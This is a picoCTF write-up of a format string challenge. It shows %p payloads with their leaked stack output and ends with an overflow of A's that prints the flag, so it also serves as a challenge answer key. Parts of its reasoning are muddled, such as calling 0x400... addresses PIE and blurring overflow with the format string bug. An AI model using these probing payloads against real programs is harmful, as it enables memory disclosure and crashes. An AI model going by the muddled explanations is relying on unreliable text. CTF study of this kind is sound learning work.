# Format String Leak — Manual Fuzzing

**Platform:** picoCTF  
**Technique:** Format String Leak / PIE Bypass  
**Difficulty:** Medium  

## Challenge Description

A binary with a format string vulnerability. The flag is stored in memory, and we need to leak it from the stack. No script, just manual fuzzing with `nc` and `%p` specifiers.

## Vulnerability

The program uses `printf` directly on user input, allowing us to read values from the stack using format specifiers like `%p`.

## Exploitation

### Step 1: Find the Leak

First, I sent a simple payload to see if the program leaks anything:
```
AAAA%p|%p|%p|%p
AAAA0x11242260|0x78fbc8d218d0|0xa70257c70257c70|0x112438a0
```


The `AAAA` marker helped identify where my input landed, but the flag wasn't visible yet.

### Step 2: Increase the Leak

I increased the number of `%p` specifiers to see more of the stack:
```
AAAA%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p
AAAA0x3ad27260|0x7dabcbcbe8d0|0x11|0x3ad288c4|(nil)|0x7ffc58428458|0x1cbeed710|(nil)|(nil)|(nil)|(nil)|0x9|0x7dabcbcc4660|0x7ffc58428388|0xf0b5ff|0x1
```

Still no flag. But I noticed some addresses looked like PIE addresses (starting with `0x400...`). I needed to see deeper into the stack.

### Step 3: Go Deeper

I sent more `%p` specifiers and grouped them to keep the output readable:
```
AAAA%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p||%p|%p|%p|%p||%p|%p|%p|%p||%p|%p|%p|%p||%p|%p|%p|%p|
```

This leaked values deeper into the stack. Among them, I saw PIE addresses:
0x400a8d
0x400a40
0x40090d
0x4007e0


These are addresses from the binary itself (PIE). The flag was likely nearby.

### Step 4: Brute Force with A's

Instead of finding the exact offset, I sent a massive number of A's to overflow the buffer and trigger the format string vulnerability with a large payload:
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```


This was enough to crash the program and print the flag.

### Step 5: Get the Flag

After sending the massive A payload, the program printed:
c391ab2cfdaacbbeefd64c66b5cc73fe
